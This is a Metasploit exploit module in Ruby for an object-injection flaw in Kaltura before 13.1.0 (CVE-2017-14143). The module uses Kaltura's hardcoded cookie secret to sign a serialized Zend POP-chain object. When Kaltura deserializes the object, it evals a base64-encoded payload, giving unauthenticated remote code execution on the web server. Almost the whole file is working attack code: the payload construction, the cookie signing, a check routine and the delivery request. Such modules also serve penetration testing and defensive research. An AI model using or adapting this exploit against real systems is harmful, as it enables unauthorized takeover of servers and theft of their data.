# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  CookieSecret = &#039;y3tAno3therS$cr3T&#039;

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Kaltura Remote PHP Code Execution over Cookie&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an Object Injection vulnerability in Kaltura.
        By exploiting this vulnerability, unauthenticated users can execute
        arbitrary code under the context of the web server user.

        Kaltura makes use of a hardcoded cookie secret which allows to sign
        arbitrary cookie data. After passing this signature check, the base64-
        decoded data is passed to PHPs unserialize() function which allows for
        code execution. The constructed object is again based on the SektionEins
        Zend code execution POP chain PoC. Kaltura versions prior to 13.1.0 are
        affected by this issue.

        A valid entry_id (which is required for this exploit) can be obtained
        from any media resource published on the kaltura installation.

        This module was tested against Kaltura 13.1.0-2 installed on Ubuntu 14.04.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Robin Verton <hello@robinverton.de>&#039;,
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # first kaltura rce module
        ],
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2017-14143&#039;]
        ],
      &#039;Privileged&#039;      => false,
      &#039;Platform&#039;        => [&#039;php&#039;],
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [ [&#039;Automatic&#039;, {}] ],
      &#039;DisclosureDate&#039;  => &#039;Sep 12 2017&#039;,
      &#039;DefaultTarget&#039;   => 0
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The target URI of the Kaltura installation&#039;, &#039;/&#039;]),
        OptString.new(&#039;ENTRYID&#039;, [true, &#039;Valid entry ID of any media resource (example: 0_lahha4c9)&#039;, &#039;&#039;])
      ]
    )
  end

  def check
    r = rand_text_alpha(15 + rand(4))
    entry_id = datastore[&#039;ENTRYID&#039;]
    cmd = "print_r(#{r}).die()"

    p = ""
    p << "a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";"
    p << "a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\00*\00_eventsToMail\";"
    p << "a:1:{i:0;i:1;}s:22:\"\00*\00_layoutEventsToMail\";a:0:{}s:8:\"\00*\00_mail\";"
    p << "O:9:\"Zend_Mail\":0:{}s:10:\"\00*\00_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\00*\00_inflector\";"
    p << "O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\00*\00_matchPattern\";s:7:\"/(.*)/e\";"
    p << "s:15:\"\00*\00_replacement\";s:#{cmd.length.to_s}:\"#{cmd}\";}s:20:\"\00*\00_inflectorEnabled\";"
    p << "b:1;s:10:\"\00*\00_layout\";s:6:\"layout\";}s:22:\"\00*\00_subjectPrependText\";N;}}};}"

    encoded = Rex::Text.encode_base64(p)
    hash = Rex::Text.md5("#{encoded}#{CookieSecret}")

    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;, &#039;keditorservices&#039;, &#039;getAllEntries&#039;),
      &#039;vars_get&#039; => {
        &#039;list_type&#039; => &#039;15&#039;,
        &#039;entry_id&#039; => entry_id
      },
      &#039;cookie&#039; => "userzone=#{encoded}#{hash}"
    )

    if res && res.redirect?
      print_error("Got a redirect, maybe you are not using https? #{res.headers[&#039;Location&#039;]}")
      Exploit::CheckCode::Safe
    elsif res && res.body.include?(r)
      Exploit::CheckCode::Vulnerable
    elsif !check_entryid
      print_error("Invalid ENTRYID")
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Safe
    end
  end

  def check_entryid
    entry_id = datastore[&#039;ENTRYID&#039;]
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;, &#039;keditorservices&#039;, &#039;getAllEntries&#039;),
      &#039;vars_get&#039; => {
        &#039;list_type&#039; => &#039;15&#039;,
        &#039;entry_id&#039; => entry_id
      }
    )

    return res.body.include? entry_id
  end

  def exploit
    entry_id = datastore[&#039;ENTRYID&#039;]
    cmd = "print_r(eval(base64_decode(&#039;#{Rex::Text.encode_base64(payload.encode)}&#039;))).die()"

    p = ""
    p << "a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";"
    p << "a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\00*\00_eventsToMail\";"
    p << "a:1:{i:0;i:1;}s:22:\"\00*\00_layoutEventsToMail\";a:0:{}s:8:\"\00*\00_mail\";"
    p << "O:9:\"Zend_Mail\":0:{}s:10:\"\00*\00_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\00*\00_inflector\";"
    p << "O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\00*\00_matchPattern\";s:7:\"/(.*)/e\";"
    p << "s:15:\"\00*\00_replacement\";s:#{cmd.length.to_s}:\"#{cmd}\";}s:20:\"\00*\00_inflectorEnabled\";"
    p << "b:1;s:10:\"\00*\00_layout\";s:6:\"layout\";}s:22:\"\00*\00_subjectPrependText\";N;}}};}"

    encoded = Rex::Text.encode_base64(p)
    hash = Rex::Text.md5("#{encoded}#{CookieSecret}")

    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;, &#039;keditorservices&#039;, &#039;getAllEntries&#039;),
      &#039;vars_get&#039; => {
        &#039;list_type&#039; => &#039;15&#039;,
        &#039;entry_id&#039; => entry_id
      },
      &#039;cookie&#039; => "userzone=#{encoded}#{hash}"
    )

    if res && res.redirect?
      print_error("Got a redirect, maybe you are not using https? #{res.headers[&#039;Location&#039;]}")
    elsif res && res.code != 200
      print_error(&#039;Unexpected response...&#039;)
    else
      print_status("Output: #{res.body}")
    end
  end
end

